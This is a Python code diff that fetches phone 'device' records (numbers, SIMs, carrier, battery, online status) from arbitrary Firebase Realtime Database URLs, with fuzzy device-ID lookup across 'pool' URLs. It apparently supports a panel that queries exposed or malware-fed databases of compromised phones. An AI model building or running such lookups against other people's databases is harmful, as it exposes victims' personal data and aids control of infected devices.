@@ -19,6 +19,7 @@ def _get_client(timeout: float = 8.0) -> httpx.AsyncClient:
 
 DEVICE_PATHS = ("clients", "devices", "device", "users", "phones")
 QUICK_DEVICE_PATHS = ("clients", "devices")
+COLLECTION_SUFFIXES = frozenset(DEVICE_PATHS)
 
 
 def normalize_firebase_url(url: str) -> str:
@@ -30,6 +31,51 @@ def normalize_firebase_url(url: str) -> str:
     if ".firebaseio.com" not in cleaned and ".firebasedatabase.app" not in cleaned:
         raise ValueError("Valid Firebase RTDB URL daalo (firebaseio.com ya firebasedatabase.app)")
     return cleaned
+
+
+def firebase_root_url(url: str) -> str:
+    """Strip trailing collection paths so pool URLs like .../clients resolve correctly."""
+    normalized = normalize_firebase_url(url)
+    parsed = urlparse(normalized)
+    parts = [part for part in parsed.path.strip("/").split("/") if part]
+    if parts and parts[-1].lower() in COLLECTION_SUFFIXES:
+        parts = parts[:-1]
+    root = f"{parsed.scheme}://{parsed.netloc}"
+    if parts:
+        return f"{root}/{'/'.join(parts)}".rstrip("/")
+    return root
+
+
+def device_id_matches(query: str, candidate: str) -> bool:
+    q = (query or "").strip().lower()
+    c = (candidate or "").strip().lower()
+    if not q or not c:
+        return False
+    if q == c:
+        return True
+    if len(q) < 4:
+        return False
+    return c.startswith(q) or c.endswith(q) or q in c
+
+
+def _pick_matching_key(query: str, keys: list[str]) -> str | None:
+    if not keys:
+        return None
+    exact = [key for key in keys if key.lower() == query.lower()]
+    if len(exact) == 1:
+        return exact[0]
+    if len(query) < 4:
+        return None
+    prefix = [key for key in keys if key.lower().startswith(query.lower())]
+    if len(prefix) == 1:
+        return prefix[0]
+    suffix = [key for key in keys if key.lower().endswith(query.lower())]
+    if len(suffix) == 1:
+        return suffix[0]
+    contains = [key for key in keys if query.lower() in key.lower()]
+    if len(contains) == 1:
+        return contains[0]
+    return None
 
 
 async def _fetch_json(url: str, *, timeout: float = 8.0) -> dict | list | None:
@@ -148,6 +194,40 @@ def _build_device_record(key: str, value: dict, prefix: str) -> dict:
                 }
             )
 
+    if not _looks_like_device(value) and value:
+        if any(
+            field in value
+            for field in (
+                "battery",
+                "battery_level",
+                "phone",
+                "phone_number",
+                "mobile",
+                "number",
+                "sim",
+                "sim1",
+                "sim2",
+                "carrier",
+                "carrier1",
+                "online",
+                "last_seen",
+                "model",
+            )
+        ):
+            pass
+        elif len(value) <= 2:
+            return {
+                "firebase_key": _join_firebase_path(prefix, key),
+                "name": name,
+                "display_name": str(key),
+                "phone_number": None,
+                "status": None,
+                "battery": None,
+                "model": None,
+                "sims": None,
+                "raw": value,
+            }
+
     return {
         "firebase_key": _join_firebase_path(prefix, key),
         "name": name,
@@ -161,6 +241,73 @@ def _build_device_record(key: str, value: dict, prefix: str) -> dict:
     }
 
 
+def _record_from_path(root: str, path: str, data: dict) -> dict:
+    if "/" in path:
+        prefix, key = path.rsplit("/", 1)
+        prefix = f"{prefix}/"
+    else:
+        prefix, key = "", path
+    return _build_device_record(key, data, prefix=prefix)
+
+
+async def _fetch_device_node(root: str, path: str, timeout: float) -> dict | None:
+    try:
+        data = await _fetch_json(f"{root}/{path}.json", timeout=timeout)
+    except httpx.HTTPError:
+        return None
+    if isinstance(data, dict):
+        return _record_from_path(root, path, data)
+    return None
+
+
+async def _shallow_collection_keys(root: str, collection: str, timeout: float) -> list[str]:
+    try:
+        data = await _fetch_json(f"{root}/{collection}.json?shallow=true", timeout=timeout)
+    except httpx.HTTPError:
+        return []
+    if isinstance(data, dict):
+        return [str(key) for key in data.keys()]
+    return []
+
+
+async def fast_find_device_in_url(
+    firebase_url: str,
+    device_id: str,
+    *,
+    timeout: float = 2.0,
+) -> dict | None:
+    """Fast Astik-style lookup: direct node fetch, then shallow clients/devices key scan."""
+    root = firebase_root_url(firebase_url)
+    query = (device_id or "").strip()
+    if not query:
+        return None
+
+    direct_paths = [query]
+    for collection in DEVICE_PATHS:
+        direct_paths.append(f"{collection}/{query}")
+
+    seen_paths: set[str] = set()
+    for path in direct_paths:
+        if path in seen_paths:
+            continue
+        seen_paths.add(path)
+        record = await _fetch_device_node(root, path, timeout)
+        if record:
+            return record
+
+    shallow_timeout = min(timeout, 1.5)
+    for collection in DEVICE_PATHS:
+        keys = await _shallow_collection_keys(root, collection, shallow_timeout)
+        matched = _pick_matching_key(query, keys)
+        if not matched:
+            continue
+        record = await _fetch_device_node(root, f"{collection}/{matched}", timeout)
+        if record:
+            return record
+
+    return None
+
+
 async def fetch_firebase_device_live(
     firebase_url: str,
     *,
@@ -170,7 +317,12 @@ async def fetch_firebase_device_live(
     timeout: float = 8.0,
 ) -> dict | None:
     """Fetch one device node live from Firebase (battery, sims, online)."""
-    base_url = normalize_firebase_url(firebase_url)
+    root = firebase_root_url(firebase_url)
+    if device_name and not firebase_key:
+        found = await fast_find_device_in_url(firebase_url, device_name, timeout=timeout)
+        if found:
+            return found
+
     candidates: list[str] = []
     if firebase_key:
         candidates.append(firebase_key.strip("/"))
@@ -186,42 +338,35 @@ async def fetch_firebase_device_live(
         if not path or path in seen:
             continue
         seen.add(path)
-        try:
-            data = await _fetch_json(f"{base_url}/{path}.json", timeout=timeout)
-        except httpx.HTTPError:
-            continue
-        if not isinstance(data, dict):
-            continue
-        if _looks_like_device(data) or any(
-            field in data for field in ("battery", "battery_level", "phone", "phone_number", "sims")
-        ):
-            if "/" in path:
-                prefix, key = path.rsplit("/", 1)
-                prefix = f"{prefix}/"
-            else:
-                prefix, key = "", path
-            return _build_device_record(key, data, prefix=prefix)
+        record = await _fetch_device_node(root, path, timeout)
+        if record:
+            return record
 
     if quick_only:
         return None
 
     all_devices = await fetch_firebase_devices(firebase_url)
-    query = (device_name or "").strip().lower()
-    key_query = (firebase_key or "").strip().lower()
+    query = (device_name or "").strip()
+    key_query = (firebase_key or "").strip()
     for item in all_devices:
-        item_key = str(item.get("firebase_key") or "").lower()
-        item_name = str(item.get("name") or "").lower()
-        if key_query and (item_key == key_query or item_key.endswith(f"/{key_query}")):
+        item_key = str(item.get("firebase_key") or "")
+        item_name = str(item.get("name") or "")
+        if key_query and device_id_matches(key_query, item_key):
             return item
-        if query and (item_name == query or item_name.endswith(query) or query in item_key):
+        if query and (device_id_matches(query, item_name) or device_id_matches(query, item_key)):
             return item
     return None
 
 
 async def fetch_firebase_devices(firebase_url: str) -> list[dict]:
     base_url = normalize_firebase_url(firebase_url)
+    root = firebase_root_url(firebase_url)
     parsed = urlparse(base_url)
     path = parsed.path.strip("/")
+    if path.split("/")[-1].lower() in COLLECTION_SUFFIXES:
+        path = path.split("/")[-1].lower()
+    else:
+        path = ""
     best_devices: list[dict] = []
 
     def consider(data: dict | list | None, prefix: str = "") -> list[dict]:
@@ -235,7 +380,7 @@ async def fetch_firebase_devices(firebase_url: str) -> list[dict]:
 
     if path:
         try:
-            devices = consider(await _fetch_json(f"{base_url}.json"))
+            devices = consider(await _fetch_json(f"{root}/{path}.json"))
             if devices:
                 return devices
         except httpx.HTTPError:
@@ -243,7 +388,7 @@ async def fetch_firebase_devices(firebase_url: str) -> list[dict]:
 
     for device_path in DEVICE_PATHS:
         try:
-            data = await _fetch_json(f"{base_url}/{device_path}.json")
+            data = await _fetch_json(f"{root}/{device_path}.json")
         except httpx.HTTPError:
             continue
         devices = consider(data, prefix=f"{device_path}/")
@@ -254,7 +399,7 @@ async def fetch_firebase_devices(firebase_url: str) -> list[dict]:
         return best_devices
 
     try:
-        data = await _fetch_json(f"{base_url}.json")
+        data = await _fetch_json(f"{root}.json")
     except httpx.HTTPError as exc:
         raise ValueError(f"Firebase connect nahi hua: {exc}") from exc
 
